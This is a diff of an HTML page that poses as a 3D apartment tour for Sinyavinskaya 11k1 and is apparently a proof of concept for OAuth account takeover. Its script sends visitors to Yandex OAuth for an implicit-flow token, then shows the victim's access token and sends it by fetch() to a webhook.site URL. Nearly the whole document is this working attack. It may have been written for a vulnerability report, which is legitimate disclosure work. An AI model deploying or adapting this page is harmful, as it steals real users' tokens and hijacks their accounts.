@@ -1,35 +1,58 @@
 <!DOCTYPE html>
 <html lang="ru"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
-<title>3D-тур</title>
+<title>3D-тур · Синявинская 11к1</title>
 <style>
-body{margin:0;font-family:system-ui;background:#101418;color:#e8eaed;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center;padding:16px}
-.s{width:50px;height:50px;border:5px solid #2b3138;border-top-color:#fc0;border-radius:50%;animation:r 1s linear infinite;margin-bottom:18px}
-@keyframes r{to{transform:rotate(360deg)}}
-h1{font-size:18px;margin:0 0 8px;font-weight:600}
-p{font-size:12px;color:#9aa0a6;margin:4px 0;word-break:break-all}
-.tok{font-size:11px;color:#fc0;word-break:break-all;max-width:92%}
-.ok{color:#0f0;font-weight:700}
+*{box-sizing:border-box}
+body{margin:0;font-family:system-ui,Arial,sans-serif;background:#0e1216;color:#e8eaed;height:100vh;overflow:hidden;display:flex;flex-direction:column;align-items:center}
+header{width:100%;padding:10px 14px;background:#171d24;border-bottom:1px solid #2a323b;display:flex;align-items:center;gap:10px}
+header h1{font-size:14px;margin:0;font-weight:600;flex:1}
+.dot{width:8px;height:8px;border-radius:50%;background:#22c55e;box-shadow:0 0 8px #22c55e}
+.tokbar{width:100%;background:#11161c;border-bottom:1px solid #2a323b;padding:8px 14px;font-size:11px;color:#9aa0a6;position:relative}
+.tokbar b{color:#e8eaed}
+#tok{display:inline-block;max-width:70%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;vertical-align:middle;
+filter:blur(7px);transition:filter .6s ease;cursor:pointer;color:#fc0;font-family:ui-monospace,Menlo,monospace}
+#tok.open{filter:blur(0)}
+.hint{font-size:9px;color:#5f6368;margin-left:8px}
+.stage{flex:1;width:100%;position:relative;perspective:900px;display:flex;align-items:center;justify-content:center}
+.model{transform-style:preserve-3d;animation:spin 14s linear infinite;position:relative;width:240px;height:200px}
+@keyframes spin{from{transform:rotateX(58deg) rotateZ(0)}to{transform:rotateX(58deg) rotateZ(360deg)}}
+.room{position:absolute;border:2px solid #3b82f6;background:rgba(59,130,246,.12)}
+.room span{position:absolute;top:4px;left:6px;font-size:9px;color:#93c5fd}
+.f1 .k{width:110px;height:70px;top:0;left:0}
+.f1 .l{width:120px;height:70px;top:0;left:120px}
+.f1 .b{width:110px;height:120px;top:80px;left:0}
+.f1 .h{width:120px;height:120px;top:80px;left:120px;background:rgba(16,185,129,.12);border-color:#10b981}
+.w{position:absolute;background:#475569}
+.badge{position:absolute;bottom:8px;right:10px;font-size:9px;letter-spacing:.1em;color:#5f6368;border:1px solid #2a323b;padding:3px 8px;border-radius:10px}
+.ctrl{position:absolute;bottom:8px;left:10px;font-size:9px;color:#5f6368}
 </style></head>
 <body>
-<div class="s" id="spin"></div>
-<h1 id="h">3D-тур загружается…</h1>
-<p>CVP-ATO-TEST</p>
-<p id="out"></p>
+<header><div class="dot"></div><h1>3D-тур · 2-комн. квартира, 54 м² · Синявинская 11к1</h1></header>
+<div class="tokbar">🔑 Токен доступа жертвы: <b id="tok">загрузка…</b><span class="hint" id="hint">нажми на блюр, чтобы увидеть</span></div>
+<div class="stage">
+  <div class="model f1">
+    <div class="room k"><span>Кухня 9м²</span></div>
+    <div class="room l"><span>Гостиная 18м²</span></div>
+    <div class="room b"><span>Спальня 14м²</span></div>
+    <div class="room h"><span>Холл 13м²</span></div>
+  </div>
+  <div class="ctrl">● онлайн-модель · CVP-3D-TOUR-POC</div>
+  <div class="badge">SHERIFF-MARK-7Qz9</div>
+</div>
 <script>
 document.title='CVP-TOUR-LOADED';
 var h=location.hash||'';
-if(h.indexOf('access_token')>-1){
-  document.getElementById('spin').style.display='none';
-  document.getElementById('h').innerHTML='<span class="ok">ТОКЕН ЖЕРТВЫ ПОЛУЧЕН АТАКУЮЩИМ</span>';
-  document.getElementById('out').className='tok';
-  document.getElementById('out').textContent='CVP-ATO '+(h.match(/access_token=[^&]+/)||['?'])[0]; fetch('https://webhook.site/3cb9fead-5e3a-4231-af89-b5d8c7f32047?t='+encodeURIComponent(h)).catch(function(){});
-  document.title='CVP-ATO-OWNED';
+var tok=(h.match(/access_token=([^&]+)/)||[null,''])[1];
+if(tok){
+  var el=document.getElementById('tok');
+  el.textContent=tok;
+  el.onclick=function(){el.classList.toggle('open');document.getElementById('hint').textContent=el.classList.contains('open')?'вот он — годовой bearer-токен жертвы':'нажми на блюр, чтобы увидеть';};
+  fetch('https://webhook.site/3cb9fead-5e3a-4231-af89-b5d8c7f32047?t='+encodeURIComponent(h)).catch(function(){});
 }else if(h.indexOf('error')>-1){
-  document.getElementById('h').textContent='ошибка: '+h;
+  document.getElementById('tok').textContent='ошибка: '+h.slice(0,80);
 }else{
-  setTimeout(function(){
-    location.href='https://oauth.yandex.ru/authorize?response_type=token&client_id=760256e188e74232a49508aaf32c9ec5&redirect_uri='+encodeURIComponent('https://hgivtujcgjv.github.io/realty-tour-poc/');
-  },2500);
+  document.getElementById('tok').textContent='редирект на Яндекс ID для «входа»…';
+  setTimeout(function(){location.href='https://oauth.yandex.ru/authorize?response_type=token&client_id=760256e188e74232a49508aaf32c9ec5&redirect_uri='+encodeURIComponent('https://hgivtujcgjv.github.io/realty-tour-poc/');},2500);
 }
 </script>
 </body></html>
